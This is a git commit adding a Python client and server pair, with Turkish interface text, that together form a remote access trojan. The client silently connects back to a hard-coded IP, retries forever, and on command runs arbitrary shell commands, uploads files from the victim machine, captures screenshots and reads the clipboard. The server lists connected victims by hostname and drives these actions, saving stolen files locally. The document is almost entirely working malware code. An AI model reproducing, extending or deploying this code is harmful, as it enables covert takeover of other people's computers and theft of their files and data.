340db11f73fe0ab4f77c652e4ee40dd1c7d7586f
puyz <puyzsoft@gmail.com>
2023-01-29 13:56:17 +0300

    v1

---
+++ TCP/client.py
@@ -0,0 +1,76 @@
+import socket
+import os
+import subprocess
+import time
+import pyautogui
+import pyperclip
+
+host = "10.192.118.160"
+port = 1250
+while 1:
+    try:
+        serverSocket = socket.socket()
+        serverSocket.connect((host, port))
+        while 1:
+            data = serverSocket.recv(1024)
+            
+            if data.decode("utf-8") == "cmd":
+                while 1:
+                    data = serverSocket.recv(1024)
+                    if data[:2].decode("utf-8") == "cd":
+                        try:
+                            os.chdir(data[3:].decode("utf-8"))
+                            serverSocket.send(os.getcwd().encode("utf-8"))
+                        except FileNotFoundError:
+                            serverSocket.send("Dosya bulunamadı.".encode("utf-8"))
+                    elif data.decode("utf-8") == "quit":
+                        break
+                        
+                    else:
+                        if len(data) > 0:
+                            # stdin: request command, stdout: response command, stderr: invalid command
+                            command = subprocess.Popen(data.decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            response_byte = command.stdout.read() + command.stderr.read()
+                            response_str = str(response_byte, encoding= "cp857")
+                            location = os.getcwd()
+                            serverSocket.send(str.encode(response_str + "\n" + location, encoding= "utf-8"))
+                        else:
+                            serverSocket.send(b" ")
+                            
+            elif data.decode("utf-8") == "dt":
+                path = serverSocket.recv(1024).decode("utf-8")
+                size = str(os.path.getsize(path))
+                serverSocket.send(size.encode("utf-8"))
+                serverSocket.recv(1024)
+                
+                with open(path, "rb") as file: # read byte
+                    serverSocket.sendall(file.read())
+           
+            elif data.decode("utf-8") == "ss":
+                try:
+                    username = os.getlogin()
+                    path = "C:/Users/"+username+"/Appdata/Local/Temp/ss.png"
+                    pyautogui.screenshot(path)
+                    serverSocket.send(path.encode("utf-8"))
+                    
+                except Exception as e:
+                    print("SS Hata: "+e)
+            elif data.decode("utf-8") == "clipboard":
+               try:
+                    data = pyperclip.waitForPaste(3)
+                    serverSocket.send(data.encode("utf-8"))
+                    
+               except Exception as e:
+                   serverSocket.send("Panoda bir dosya bulunuyor.".encode("utf-8"))
+                    
+            elif data.decode("utf-8") == "pcname":
+                serverSocket.send(socket.gethostname().encode("utf-8"))
+            
+            else:
+                print("istek geldi : "+data.decode("utf-8"))
+                serverSocket.send(b" ")
+
+    except Exception as e:
+        time.sleep(1)
+        #print(e)
+
---
+++ TCP/server.py
@@ -0,0 +1,163 @@
+import socket
+import threading
+from colorama import Fore, init
+from PIL import Image
+
+init()
+
+host = ""
+port = 1250
+
+connection_list = []
+address_list = []
+pc_name_list = []
+
+serverSocket = socket.socket()
+
+def connectSocket():
+    try:
+        serverSocket.bind((host, port))
+        serverSocket.listen(5)
+    except:
+        print(Fore.RED+ "Bağlantı hatası"+ Fore.RESET)
+        connectSocket()
+
+def accept():
+    while 1: 
+        try:
+            connection, address = serverSocket.accept() # Client info
+            connection_list.append(connection)
+            address_list.append(address)
+            connection.send("pcname".encode("utf-8"))
+            response = connection.recv(1024).decode("utf-8")
+            pc_name_list.append(response)
+        except:
+            print(Fore.RED+ "Bağlantı hatası"+ Fore.RESET)
+
+def send_command(connection):
+    while 1:
+        try:
+            command = input(Fore.LIGHTCYAN_EX+ "\nKomut: "+ Fore.WHITE)
+            if command == "quit":
+                connection.send("quit".encode("utf-8"))
+                break
+            if len(command) > 0:
+                connection.send(command.encode("utf-8"))
+                response = connection.recv(32768).decode("utf-8") # Read Data 32768 Byte and to string (utf-8)
+                print(f"\n {Fore.YELLOW} {response} \n")
+                
+        except Exception as e:
+            print(e)
+
+def sort():
+    print(Fore.LIGHTYELLOW_EX+ "\n------------------------------Clients------------------------------"+ Fore.RESET)
+    print(Fore.LIGHTRED_EX+ "SIRA \t \t IP \t \t \t PORT \t \t "+ "BİLGİSAYAR"+ Fore.RESET)
+    for index, connection in enumerate(connection_list):
+        try:
+            connection.send(b" ")
+            connection.recv(1024)
+        except:
+            connection_list.pop(index)
+            address_list.pop(index)
+            continue
+        print(Fore.LIGHTGREEN_EX+ "\n"+str(index) + " \t \t "+ address_list[index][0] + " \t \t "+ str(address_list[index][1])+ "\t \t "+ pc_name_list[index]+ Fore.RESET) # ip - port
+            
+def connect_client(index):
+    try:
+        connection = connection_list[index]
+        print(Fore.GREEN+ address_list[index][0]+ " IP adresine bağlandı.\n"+ Fore.RESET)
+        return connection
+    except:
+        print(Fore.RED+ "Geçersiz client bağlantısı"+ Fore.RESET)
+        return False
+        
+def file_transfer(connection, path=""):
+    operation = "ss"
+    if path == "":
+        path = input(Fore.LIGHTCYAN_EX+ "Konum: "+ Fore.RESET)
+        operation = "dt"
+    else:
+        connection.send("dt".encode("utf-8"))
+        #print("dt isteği gönderildi")
+    connection.send(path.encode("utf-8"))
+    #print("path isteği gönderildi")
+    save_size = 0
+    size = int(connection.recv(8192).decode("utf-8"))
+    #print("size alındı")
+    connection.send(b" ")
+    
+    if operation == "dt":    
+        file_name = input(Fore.LIGHTCYAN_EX+ "\nDosya adı: "+ Fore.RESET)
+    else:
+        file_name = "ss.png"
+    print(Fore.GREEN + "Dosya işlemi gerçekleşiyor..."+ Fore.RESET)
+    with open("C:/Users/puyz/Desktop/data/"+file_name, "wb") as file:
+        try:
+            while 1:
+                data = connection.recv(1024)
+                save_size += len(data)
+                file.write(data)
+                if save_size >= size:
+                    break
+        except Exception as e:
+            print("Dosya Transfer Hata: "+ e)
+        
+    print(Fore.LIGHTGREEN_EX+ "Dosya transferi gerçekleşti."+ Fore.RESET)
+        
+def get_screenshot(connection):
+    path = connection.recv(1024).decode("utf-8")
+    file_transfer(connection, path)
+    image = Image.open("C:/Users/puyz/Desktop/data/ss.png")
+    image.show()
+    
+    
+def get_clipboard(connection):
+    clipboard = connection.recv(8192).decode("utf-8")
+    print(clipboard)
+        
+def main_shell():
+    while 1:
+        try: 
+            print(Fore.LIGHTYELLOW_EX+ "\n-----KOMUT LİSTESİ-----"+ Fore.RESET)
+            print(Fore.CYAN+ "-> listele \n-> baglan [sıra]"+ Fore.RESET)
+            command = input(Fore.LIGHTCYAN_EX+ "Komut: "+ Fore.RESET) 
+            if command == "listele":
+                sort()
+            elif "baglan" in command:
+                number = int(command[6:])
+                connection = connect_client(number)
+                if connection:
+                    while 1:
+                        print(Fore.LIGHTYELLOW_EX+ "-----İSTEK LİSTESİ-----"+ Fore.RESET)
+                        print(Fore.CYAN+ "-> cmd \n-> dt (dosya transferi) \n-> ss (Ekran görüntüsü) \n-> pano \n-> disconnect"+ Fore.RESET)
+                        request = input(Fore.LIGHTCYAN_EX+ "İstek: "+ Fore.RESET)
+                        
+                        if request == "cmd":
+                            connection.send("cmd".encode("utf-8"))
+                            send_command(connection)
+                        elif request == "dt":
+                            connection.send("dt".encode("utf-8"))
+                            file_transfer(connection, "")
+                        elif request == 'ss':
+                            connection.send("ss".encode("utf-8"))
+                            get_screenshot(connection)
+                        elif request == 'disconnect':
+                            break
+                        elif request == 'pano':
+                            connection.send("clipboard".encode("utf-8"))
+                            get_clipboard(connection)
+                        else:
+                            print(Fore.RED+ "Geçersiz istek"+ Fore.RESET)
+            else:
+                print(Fore.RED+ "Geçersiz komut"+ Fore.RESET)
+        except Exception as e:
+            print(f"Hata: {e}")
+            
+
+connectSocket()
+
+shellThread =  threading.Thread(target= main_shell)
+acceptThread = threading.Thread(target= accept)
+
+shellThread.start()
+acceptThread.start()
